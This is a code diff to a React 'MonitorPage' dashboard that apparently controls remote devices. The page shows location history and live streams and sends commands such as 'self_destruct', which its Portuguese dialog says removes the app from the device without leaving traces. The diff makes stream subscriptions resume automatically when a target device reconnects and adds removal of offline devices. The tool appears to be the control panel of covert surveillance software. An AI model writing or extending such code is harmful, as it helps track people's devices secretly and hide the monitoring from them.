@@ -190,6 +190,7 @@ export default function MonitorPage() {
   const locationHistoryRef = useRef<LocPoint[]>([]);
   const showRouteRef       = useRef(false);
   const expandedStreamRef  = useRef<string | null>(null);
+  const devicesRef         = useRef<Device[]>([]);
 
   // Leaflet refs — main map
   const mapRef        = useRef<unknown>(null);
@@ -207,6 +208,7 @@ export default function MonitorPage() {
   useEffect(() => { activeStreamsRef.current  = activeStreams;   }, [activeStreams]);
   useEffect(() => { locationHistoryRef.current = locationHistory; }, [locationHistory]);
   useEffect(() => { showRouteRef.current      = showRoute;       }, [showRoute]);
+  useEffect(() => { devicesRef.current        = devices;         }, [devices]);
   useEffect(() => { expandedStreamRef.current = expandedStream;  }, [expandedStream]);
 
   // fps counter
@@ -422,6 +424,17 @@ export default function MonitorPage() {
 
         case 'devices': {
           const list = msg.list as Device[];
+          // re-subscribe streams when active device comes back online after being offline
+          const activeId = activeDeviceRef.current;
+          if (activeId && activeStreamsRef.current.size > 0) {
+            const wasOffline = !devicesRef.current.find(d => d.id === activeId)?.online;
+            const nowOnline  = !!list.find(d => d.id === activeId)?.online;
+            if (wasOffline && nowOnline) {
+              activeStreamsRef.current.forEach(stream => {
+                ws.send(JSON.stringify({ type: 'cmd', action: 'subscribe', stream, deviceId: activeId }));
+              });
+            }
+          }
           setDevices(list);
           setActiveDeviceId(prev => {
             if (prev && list.find(d => d.id === prev)) return prev;
@@ -538,6 +551,12 @@ export default function MonitorPage() {
 
   function selfDestruct(deviceId: string) {
     wsRef.current?.send(JSON.stringify({ type: 'cmd', action: 'self_destruct', deviceId }));
+    setDestroyConfirm(null);
+  }
+
+  function removeDevice(deviceId: string) {
+    wsRef.current?.send(JSON.stringify({ type: 'cmd', action: 'remove_device', deviceId }));
+    if (activeDeviceId === deviceId) setActiveDeviceId(null);
     setDestroyConfirm(null);
   }
 
@@ -1063,18 +1082,24 @@ export default function MonitorPage() {
             onClick={e => e.stopPropagation()}>
             <div className="flex items-center gap-2 mb-3">
               <Trash2 className="w-5 h-5 text-red-400" />
-              <h2 className="text-base font-bold text-white">Autodestruição</h2>
+              <h2 className="text-base font-bold text-white">
+                {destroyConfirm.online ? 'Autodestruição' : 'Remover aparelho'}
+              </h2>
             </div>
             <p className="text-sm text-gray-300 mb-1">
               Remover <span className="font-semibold text-white">{destroyConfirm.name}</span> permanentemente?
             </p>
-            <p className="text-xs text-gray-500 mb-5">O app será removido do aparelho sem deixar rastros.</p>
+            <p className="text-xs text-gray-500 mb-5">
+              {destroyConfirm.online
+                ? 'O app será removido do aparelho sem deixar rastros.'
+                : 'O aparelho está offline — ele será removido da lista e do histórico. Se o app ainda estiver instalado, ele pode reaparecer ao reconectar.'}
+            </p>
             <div className="flex gap-2">
               <button onClick={() => setDestroyConfirm(null)}
                 className="flex-1 py-2 rounded-lg text-sm text-gray-400 bg-gray-800 hover:bg-gray-700 transition-colors">
                 Cancelar
               </button>
-              <button onClick={() => selfDestruct(destroyConfirm.id)}
+              <button onClick={() => destroyConfirm.online ? selfDestruct(destroyConfirm.id) : removeDevice(destroyConfirm.id)}
                 className="flex-1 py-2 rounded-lg text-sm font-semibold text-white bg-red-700 hover:bg-red-600 transition-colors">
                 Remover
               </button>
